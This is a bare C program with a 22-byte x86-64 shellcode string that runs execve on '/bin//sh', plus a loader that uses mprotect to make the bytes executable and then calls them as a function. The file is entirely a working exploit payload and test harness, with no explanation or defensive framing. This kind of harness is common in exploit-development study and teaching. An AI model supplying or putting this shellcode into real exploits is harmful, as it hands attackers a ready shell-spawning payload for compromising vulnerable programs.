#include <sys/mman.h>
#include <stdint.h>

char shellcode[] = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";

int main(){
  mprotect((void *)((uint64_t)shellcode & ~4095), 4096, PROT_READ|PROT_EXEC);
  (*(void(*)()) shellcode)();
  return 0;
}
